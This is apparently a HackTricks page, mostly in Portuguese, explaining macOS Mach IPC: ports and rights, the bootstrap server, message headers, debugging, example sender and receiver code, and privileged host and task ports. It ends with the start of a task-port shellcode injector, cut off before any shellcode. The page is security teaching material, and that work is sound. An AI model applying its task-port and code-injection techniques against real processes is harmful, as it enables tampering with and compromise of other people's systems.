# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach usa **tasks** como a **menor unidade** para compartilhar recursos, e cada task pode conter **múltiplas threads**. Essas **tasks e threads são mapeadas 1:1 para processos e threads POSIX**.

A comunicação entre tasks ocorre via Mach Inter-Process Communication (IPC), utilizando canais de comunicação unidirecionais. **Mensagens são transferidas entre ports**, que funcionam como **filas de mensagens** gerenciadas pelo kernel.

Um **port** é o **elemento básico** do Mach IPC. Ele pode ser usado para **enviar mensagens e para recebê-las**.

Cada processo possui uma **IPC table**, onde é possível encontrar os **mach ports do processo**. O nome de um mach port é, na verdade, um número (um ponteiro para o objeto do kernel).

Um processo também pode enviar um nome de port com alguns direitos **para uma task diferente** e o kernel fará essa entrada aparecer na **IPC table da outra task**.

### Port Rights

Port rights, que definem que operações uma task pode executar, são fundamentais para essa comunicação. Os possíveis **port rights** são ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, que permite receber mensagens enviadas para o port. Mach ports são MPSC (multiple-producer, single-consumer) queues, o que significa que pode haver apenas **um receive right para cada port** em todo o sistema (diferente de pipes, onde múltiplos processos podem segurar file descriptors para a ponta de leitura do pipe).
- Uma **task com o Receive** right pode receber mensagens e **criar Send rights**, permitindo que ela envie mensagens. Originalmente apenas a **própria task tem Receive right sobre seu port**.
- Se o dono do Receive right **morrer** ou o liberar, o **send right torna-se inútil (dead name).**
- **Send right**, que permite enviar mensagens para o port.
- O Send right pode ser **clonado**, então uma task que possui um Send right pode clonar o right e **concedê-lo a uma terceira task**.
- Note que **port rights** também podem ser **passados** através de Mac messages.
- **Send-once right**, que permite enviar uma mensagem para o port e então desaparece.
- Esse right **não pode** ser **clonado**, mas pode ser **movido**.
- **Port set right**, que denota um _port set_ em vez de um único port. Desenfileirar uma mensagem de um port set desenfileira uma mensagem de um dos ports que ele contém. Port sets podem ser usados para escutar vários ports simultaneamente, de forma semelhante a `select`/`poll`/`epoll`/`kqueue` no Unix.
- **Dead name**, que não é um direito de port real, mas meramente um placeholder. Quando um port é destruído, todos os port rights existentes para o port se tornam dead names.

**Tasks podem transferir SEND rights para outros**, habilitando-os a enviar mensagens de volta. **SEND rights também podem ser clonados, então uma task pode duplicar e dar o right a uma terceira task**. Isso, combinado com um processo intermediário conhecido como **bootstrap server**, permite comunicação efetiva entre tasks.

### File Ports

File ports permitem encapsular file descriptors em Mac ports (usando Mach port rights). É possível criar um `fileport` a partir de um FD usando `fileport_makeport` e criar um FD a partir de um fileport usando `fileport_makefd`.

### Establishing a communication

Como mencionado anteriormente, é possível enviar rights usando Mach messages, entretanto, você **não pode enviar um right sem já ter um right** para enviar uma Mach message. Então, como é estabelecida a primeira comunicação?

Para isso, o **bootstrap server** (**launchd** no mac) está envolvido: como **qualquer um pode obter um SEND right para o bootstrap server**, é possível pedir a ele por um right para enviar uma mensagem a outro processo:

1. Task **A** cria um **novo port**, obtendo o **RECEIVE right** sobre ele.
2. Task **A**, sendo o detentor do RECEIVE right, **gera um SEND right para o port**.
3. Task **A** estabelece uma **conexão** com o **bootstrap server**, e **envia a ele o SEND right** pelo port que gerou no início.
- Lembre-se que qualquer um pode obter um SEND right para o bootstrap server.
4. Task A envia uma mensagem `bootstrap_register` ao bootstrap server para **associar o port dado a um nome** como `com.apple.taska`
5. Task **B** interage com o **bootstrap server** para executar um bootstrap **lookup pelo nome do serviço** (`bootstrap_lookup`). Para que o bootstrap server possa responder, a task B enviará a ele um **SEND right para um port que criou previamente** dentro da mensagem de lookup. Se o lookup for bem-sucedido, o **servidor duplica o SEND right** recebido da Task A e **o transmite para a Task B**.
- Lembre-se que qualquer um pode obter um SEND right para o bootstrap server.
6. Com esse SEND right, **Task B** é capaz de **enviar** uma **mensagem** **para Task A**.
7. Para uma comunicação bidirecional, normalmente a task **B** gera um novo port com um **RECEIVE** right e um **SEND** right, e dá o **SEND right para Task A** para que ela possa enviar mensagens para TASK B (comunicação bidirecional).

O bootstrap server **não pode autenticar** o nome do serviço reivindicado por uma task. Isso significa que uma **task** poderia potencialmente **se passar por qualquer task do sistema**, como falsamente **reivindicar um nome de serviço de autorização** e então aprovar todas as requisições.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios **protegidos por SIP**: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Junto a cada nome de serviço, o **binário associado também é armazenado**. O bootstrap server criará e manterá um **RECEIVE right para cada um desses nomes de serviço**.

Para esses serviços pré-definidos, o **processo de lookup difere ligeiramente**. Quando um nome de serviço está sendo procurado, launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

- Task **B** inicia um bootstrap **lookup** por um nome de serviço.
- **launchd** verifica se a task está em execução e, se não estiver, **a inicia**.
- Task **A** (o serviço) realiza um **bootstrap check-in** (`bootstrap_check_in()`). Aqui, o **bootstrap** server cria um SEND right, retém ele, e **transfere o RECEIVE right para a Task A**.
- launchd duplica o **SEND right e o envia para Task B**.
- Task **B** gera um novo port com um **RECEIVE** right e um **SEND** right, e dá o **SEND right para Task A** (o svc) para que ele possa enviar mensagens para TASK B (comunicação bidirecional).

No entanto, esse processo aplica-se apenas a tasks do sistema pré-definidas. Tasks não-sistêmicas ainda operam como descrito originalmente, o que poderia potencialmente permitir impersonificação.

> [!CAUTION]
> Therefore, launchd should never crash or the whole sysem will crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

A função `mach_msg`, essencialmente uma syscall, é utilizada para enviar e receber Mach messages. A função requer que a mensagem a ser enviada seja o argumento inicial. Essa mensagem deve começar com uma estrutura `mach_msg_header_t`, seguida pelo conteúdo real da mensagem. A estrutura é definida como segue:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

O campo inicial **`msgh_bits`** é um bitmap:

- O primeiro bit (mais significativo) é usado para indicar que uma mensagem é complexa (mais sobre isso abaixo)
- O 3º e o 4º são usados pelo kernel
- Os **5 bits menos significativos do 2º byte** podem ser usados para **voucher**: outro tipo de port para enviar combinações chave/valor.
- Os **5 bits menos significativos do 3º byte** podem ser usados para **local port**
- Os **5 bits menos significativos do 4º byte** podem ser usados para **remote port**

Os tipos que podem ser especificados no voucher, local e remote ports são (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Em 32 bits, todos os descritores têm 12B e o tipo do descritor está no 11º. Em 64 bits, os tamanhos variam.

> [!CAUTION]
> O kernel vai copiar os descritores de uma task para a outra, mas primeiro **criando uma cópia na memória do kernel**. Essa técnica, conhecida como "Feng Shui", tem sido abusada em vários exploits para fazer o **kernel copiar dados para sua memória**, fazendo com que um processo envie descritores para si mesmo. Então o processo pode receber as mensagens (o kernel as liberará).
>
> Também é possível **enviar port rights para um processo vulnerável**, e os port rights simplesmente aparecerão no processo (mesmo que ele não os esteja manipulando).

### APIs do Mac Ports

Observe que ports estão associadas ao task namespace, portanto, para criar ou procurar por um port, o task namespace também é consultado (mais em `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Criar** um port.
- `mach_port_allocate` também pode criar um **port set**: um receive right sobre um grupo de ports. Sempre que uma mensagem é recebida, é indicado o port de onde ela veio.
- `mach_port_allocate_name`: Muda o nome do port (por padrão inteiro de 32 bits)
- `mach_port_names`: Obtém nomes de ports de um alvo
- `mach_port_type`: Obtém rights de uma task sobre um nome
- `mach_port_rename`: Renomeia um port (como dup2 para FDs)
- `mach_port_allocate`: Aloca um novo RECEIVE, PORT_SET ou DEAD_NAME
- `mach_port_insert_right`: Cria um novo right em um port onde você tem RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funções usadas para **enviar e receber mensagens mach**. A versão overwrite permite especificar um buffer diferente para recepção de mensagens (a outra versão apenas o reutilizará).

### Depurar mach_msg

Como as funções **`mach_msg`** e **`mach_msg_overwrite`** são as usadas para enviar e receber mensagens, definir um breakpoint nelas permitirá inspecionar as mensagens enviadas e recebidas.

Por exemplo, comece a depurar qualquer aplicação que você possa depurar, pois ela carregará **`libSystem.B` que usará essa função**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Para obter os argumentos de **`mach_msg`**, verifique os registradores. Estes são os argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtenha os valores dos registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspecione o cabeçalho da mensagem verificando o primeiro argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Esse tipo de `mach_msg_bits_t` é muito comum para permitir uma resposta.

### Enumerar portas
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
O **nome** é o nome padrão dado ao port (veja como ele está **aumentando** nos primeiros 3 bytes). O **`ipc-object`** é o **ofuscado** único **identificador** do port.\
Observe também como os ports com apenas o direito **`send`** estão **identificando o proprietário** dele (port name + pid).\
Observe também o uso de **`+`** para indicar **outras tasks conectadas ao mesmo port**.

Também é possível usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver também os **nomes de serviço registrados** (com SIP desabilitado devido à necessidade de `com.apple.system-task-port`):
```
procesp 1 ports
```
Você pode instalar esta ferramenta no iOS baixando-a de [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemplo de código

Observe como o **remetente** **aloca** uma porta, cria um **send right** para o nome `org.darlinghq.example` e o envia para o **bootstrap server**, enquanto o **remetente** solicitou o **send right** desse nome e o usou para **enviar uma mensagem**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Portas Privilegiadas

Existem algumas portas especiais que permitem **realizar certas ações sensíveis ou acessar certos dados sensíveis** caso uma tarefa tenha permissões de **SEND** sobre elas. Isso torna essas portas muito interessantes do ponto de vista de um atacante não só pelas capacidades, mas porque é possível **compartilhar permissões SEND entre tarefas**.

### Portas Especiais do Host

Essas portas são representadas por um número.

Os direitos de **SEND** podem ser obtidos chamando **`host_get_special_port`** e direitos de **RECEIVE** chamando **`host_set_special_port`**. Entretanto, ambas as chamadas requerem a porta **`host_priv`** que somente o root pode acessar. Além disso, no passado o root podia chamar **`host_set_special_port`** e sequestrar portas arbitrárias — o que permitia, por exemplo, contornar code signatures ao sequestrar `HOST_KEXTD_PORT` (agora o SIP previne isso).

Estas são divididas em 2 grupos: As **primeiras 7 portas são propriedade do kernel** sendo a 1 `HOST_PORT`, a 2 `HOST_PRIV_PORT`, a 3 `HOST_IO_MASTER_PORT` e a 7 é `HOST_MAX_SPECIAL_KERNEL_PORT`.\
As que começam **a partir** do número **8** são **propriedade de daemons do sistema** e podem ser encontradas declaradas em [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Se um processo tem privilégio de **SEND** sobre esta porta ele pode obter **informações** sobre o **sistema** chamando rotinas como:
- `host_processor_info`: Obter informações do processador
- `host_info`: Obter informações do host
- `host_virtual_physical_table_info`: Tabela de páginas Virtual/Física (requer MACH_VMDEBUG)
- `host_statistics`: Obter estatísticas do host
- `mach_memory_info`: Obter layout de memória do kernel
- **Host Priv port**: Um processo com direito **SEND** sobre esta porta pode executar **ações privilegiadas** como mostrar dados de boot ou tentar carregar uma extensão do kernel. O **processo precisa ser root** para obter essa permissão.
- Além disso, para chamar a API **`kext_request`** é necessário ter outros entitlements **`com.apple.private.kext*`**, que são dados apenas a binários da Apple.
- Outras rotinas que podem ser chamadas são:
- `host_get_boot_info`: Obter `machine_boot_info()`
- `host_priv_statistics`: Obter estatísticas privilegiadas
- `vm_allocate_cpm`: Alocar Memória Física Contígua
- `host_processors`: Enviar direito para processadores do host
- `mach_vm_wire`: Tornar memória residente
- Como o **root** pode acessar essa permissão, ele poderia chamar `host_set_[special/exception]_port[s]` para **sequestrar portas especiais ou de exceção do host**.

É possível **ver todas as portas especiais do host** executando:
```bash
procexp all ports | grep "HSP"
```
### Portas Especiais de Task

Estas são portas reservadas para serviços bem conhecidos. É possível obtê-las/defini-las chamando `task_[get/set]_special_port`. Podem ser encontradas em `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
A partir de [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: A porta usada para controlar esta task. Usada para enviar mensagens que afetam a task. Esta é a porta retornada por **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: O bootstrap port da task. Usado para enviar mensagens solicitando o retorno de outras portas de serviços do sistema.
- **TASK_HOST_NAME_PORT**\[host-self send right]: A porta usada para solicitar informações do host que a contém. Esta é a porta retornada por **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: A porta que nomeia a fonte da qual esta task obtém sua wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: A porta que nomeia a fonte da qual esta task obtém sua default memory managed memory.

### Task Ports

Originalmente o Mach não tinha "processes"; tinha "tasks", que eram consideradas mais como um contêiner de threads. Quando o Mach foi mesclado com o BSD **cada task foi correlacionada com um processo BSD**. Portanto, todo processo BSD tem os detalhes necessários para ser um processo e toda task do Mach também tem seu funcionamento interno (exceto pelo inexistente pid 0 que é o `kernel_task`).

Existem duas funções muito interessantes relacionadas a isso:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtém um SEND right para o task port da task relacionada ao `pid` especificado e o entrega ao `target_task_port` indicado (que normalmente é a task chamadora que usou `mach_task_self()`, mas pode ser um SEND port em outra task).
- `pid_for_task(task, &pid)`: Dado um SEND right para uma task, encontra a qual PID essa task está relacionada.

Para executar ações dentro da task, a task precisa de um `SEND` right para si mesma chamando `mach_task_self()` (que usa o `task_self_trap` (28)). Com essa permissão uma task pode executar várias ações como:

- `task_threads`: Get SEND right over all task ports of the threads of the task
- `task_info`: Get info about a task
- `task_suspend/resume`: Suspend or resume a task
- `task_[get/set]_special_port`
- `thread_create`: Create a thread
- `task_[get/set]_state`: Control task state
- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Atenção: com um SEND right sobre o task port de uma **task diferente**, é possível executar tais ações nessa outra task.

Além disso, o task_port é também a porta **`vm_map`**, que permite **ler e manipular memória** dentro de uma task com funções como `vm_read()` e `vm_write()`. Isso basicamente significa que uma task com SEND rights sobre o task_port de uma task diferente poderá **injetar código nessa task**.

Lembre-se que, como o **kernel também é uma task**, se alguém conseguir obter **SEND permissions** sobre o **`kernel_task`**, poderá fazer com que o kernel execute qualquer coisa (jailbreaks).

- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
- These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
- If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
- Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
- **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

**The task name port:** Uma versão sem privilégios do _task port_. Ele referencia a task, mas não permite controlá-la. A única coisa que parece estar disponível através dele é `task_info()`.

### Thread Ports

Threads também têm portas associadas, que são visíveis a partir da task chamando **`task_threads`** e a partir do processor com `processor_set_threads`. Um SEND right para o thread port permite usar funções do subsistema `thread_act`, como:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Qualquer thread pode obter esta porta chamando **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Você pode pegar um shellcode a partir de:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** o programa anterior e adicione as **entitlements** para poder injetar código com o mesmo usuário (caso contrário, será necessário usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
